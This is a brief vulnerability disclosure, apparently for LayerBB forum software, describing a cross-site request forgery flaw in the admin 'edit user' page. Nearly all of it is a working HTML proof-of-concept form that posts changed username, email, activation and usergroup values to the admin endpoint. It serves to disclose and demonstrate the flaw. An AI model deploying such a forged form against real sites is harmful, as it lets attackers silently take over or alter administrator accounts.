# Edit User CSRF
Allows for User settings in the admin control panel to be edited through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="http://localhost/admin/edit_user.php/id/1" method="POST" style="padding: 25px;">
    <label for="username">Username</label>
    <input type="text" name="username" id="username" value="Administrator" class="form-control">
    <label for="email">Email Address</label>
    <input type="text" name="email" id="email" value="demo@layerbb.com" class="form-control">
    <label for="usermsg">User Message</label>
    <input type="text" name="usermsg" id="usermsg" value="User" class="form-control">
    <label for="signature">User Signature</label>
    <textarea id="editor" name="signature" class="form-control" style="min-height:250px;"></textarea>
    <label for="disabled">User Activated</label><br>
    <input type="radio" name="disabled" value="0" checked=""> Do Not Change<br>
    <input type="radio" name="disabled" value="0"> Active<br>
    <input type="radio" name="disabled" value="1"> Disabled<br>
    <br>
    <label for="usergroup">Usergroup</label><br>
    <select name="usergroup" id="usergroup" style="width:100%;">
    <option value="4" selected="">Dont Change</option>
    <option value="1">User</option><option value="2">Banned</option><option value="3">Moderator</option><option value="4">Administrator</option>
    </select><br><br>
    <input type="submit" name="update" value="Save Changes" class="btn btn-default">
</form>
```
